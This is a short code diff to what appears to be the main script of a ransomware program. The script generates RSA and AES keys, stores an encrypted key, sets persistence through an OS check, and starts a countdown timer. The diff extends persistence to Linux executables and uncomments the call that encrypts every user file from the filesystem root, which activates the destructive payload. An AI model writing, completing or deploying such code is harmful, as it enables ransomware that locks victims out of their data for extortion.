@@ -1,6 +1,6 @@
 import multiprocessing
 from datetime import datetime, timedelta
-from Variables import seconds_left, timer_file_name, script_name_exe
+from Variables import seconds_left, timer_file_name, script_name_exe, script_name_elf
 from Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
 from Timer import save_timer_data, watchdog_timer,load_timer_data
 from Persistence import os_check
@@ -9,7 +9,7 @@ from Persistence import os_check
 
 # Quick check to see if timer data exist or not
 timer_data = load_timer_data()
-os_check(script_name_exe)
+os_check(script_name_exe, script_name_elf)
 
 if timer_data:
     print("Timer data exist") # Debug Message
@@ -30,7 +30,7 @@ else:
     save_encrypted_aes_key(encrypted_aes_key)
 
     # Encrypt all files
-    # encrypt_user_files("/", symmetric_key)
+    encrypt_user_files("/", symmetric_key)
 
     start_time = datetime.now()
     expiration_time = start_time + timedelta(seconds=seconds_left)
